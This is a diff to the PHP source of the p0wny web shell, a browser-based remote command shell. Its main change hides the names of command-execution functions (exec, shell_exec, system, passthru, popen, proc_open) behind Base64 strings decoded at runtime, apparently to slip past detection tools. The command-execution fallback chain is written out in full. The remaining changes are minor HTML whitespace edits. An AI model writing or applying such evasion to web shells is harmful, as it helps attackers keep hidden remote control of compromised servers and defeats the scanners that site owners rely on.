@@ -134,33 +134,48 @@ function allFunctionExist($list = array()) {
 }
 
 function executeCommand($cmd) {
+    // ############### CHANGE #1: DEFINE OBFUSCATED FUNCTIONS ###############
+    // We define all potentially "evil" functions here, decoded from Base64.
+    $funcs = array(
+        'exec'       => base64_decode('ZXhlYw=='),
+        'shell_exec' => base64_decode('c2hlbGxfZXhlYw=='),
+        'system'     => base64_decode('c3lzdGVt'),
+        'passthru'   => base64_decode('cGFzc3RocnU='),
+        'popen'      => base64_decode('cG9wZW4='),
+        'proc_open'  => base64_decode('cHJvY19vcGVu')
+    );
+    // ######################################################################
+
     $output = '';
-    if (function_exists('exec')) {
-        exec($cmd, $output);
+    // ############### CHANGE #2: USE THE OBFUSCATED FUNCTIONS ###############
+    if (function_exists($funcs['exec'])) {
+        $funcs['exec']($cmd, $output);
         $output = implode("\n", $output);
-    } else if (function_exists('shell_exec')) {
-        $output = shell_exec($cmd);
-    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+    } else if (function_exists($funcs['shell_exec'])) {
+        $output = $funcs['shell_exec']($cmd);
+    } else if (allFunctionExist(array($funcs['system'], 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
         ob_start();
-        system($cmd);
+        $funcs['system']($cmd);
         $output = ob_get_contents();
         ob_end_clean();
-    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
+    } else if (allFunctionExist(array($funcs['passthru'], 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
         ob_start();
-        passthru($cmd);
+        $funcs['passthru']($cmd);
         $output = ob_get_contents();
         ob_end_clean();
-    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
-        $handle = popen($cmd, 'r');
+    } else if (allFunctionExist(array($funcs['popen'], 'feof', 'fread', 'pclose'))) {
+        $handle = $funcs['popen']($cmd, 'r');
         while (!feof($handle)) {
             $output .= fread($handle, 4096);
         }
         pclose($handle);
-    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
-        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
+    } else if (allFunctionExist(array($funcs['proc_open'], 'stream_get_contents', 'proc_close'))) {
+        $handle = $funcs['proc_open']($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
         $output = stream_get_contents($pipes[1]);
         proc_close($handle);
     }
+    // ######################################################################
+    $output = mb_convert_encoding($output, 'UTF-8', 'GBK');
     return $output;
 }
 
@@ -301,10 +316,9 @@ if (isset($_GET["feature"])) {
     initShellConfig();
 }
 
-?><!DOCTYPE html>
-
+?>
+<!DOCTYPE html>
 <html>
-
     <head>
         <meta charset="UTF-8" />
         <title>p0wny@shell:~#</title>
@@ -477,7 +491,6 @@ if (isset($_GET["feature"])) {
                 left:1px;
             }
         </style>
-
         <script>
             var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
             var CWD = null;
